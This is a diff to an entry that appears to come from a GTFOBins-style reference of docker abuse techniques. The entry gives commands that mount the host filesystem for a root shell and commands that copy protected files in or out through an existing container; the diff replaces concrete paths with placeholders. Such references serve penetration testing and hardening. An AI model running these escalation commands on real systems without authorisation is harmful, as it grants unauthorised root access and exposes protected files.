@@ -6,19 +6,21 @@ functions:
     - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
       code: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   file-write:
-    - description: Write any file by copying it to an existing container and back to the target destination on the host. The file will be owned by root.
+    - description: Write any file by copying it to an existing container and back to the target destination on the host.
       code: |
         CONTAINER_ID=existing-docker-container
-        echo "sensitive config" > /tmp/file.txt
-        sudo docker cp /tmp/file.txt $CONTAINER_ID:/tmp/file.txt
-        sudo docker cp $CONTAINER_ID:/tmp/file.txt /target/destination.txt
+        TF=$(mktemp)
+        echo "DATA" > $TF
+        docker cp $TF $CONTAINER_ID:$TF
+        docker cp $CONTAINER_ID:$TF file_to_write
   file-read:
     - description: Read any file by copying it to an existing container and back to a new location on the host.
       code: |
         CONTAINER_ID=existing-docker-container
-        sudo docker cp /root/protected.txt $CONTAINER_ID:/tmp/file.txt
-        sudo docker cp $CONTAINER_ID:/tmp/file.txt /home/user/file.txt
-        cat /home/user/file.txt
+        TF=$(mktemp)
+        docker cp file_to_read $CONTAINER_ID:$TF
+        docker cp $CONTAINER_ID:$TF $TF
+        cat $TF
   sudo:
     - description: Any other Docker Linux image should work, e.g., `debian`. The resulting is a root shell.
       code: sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
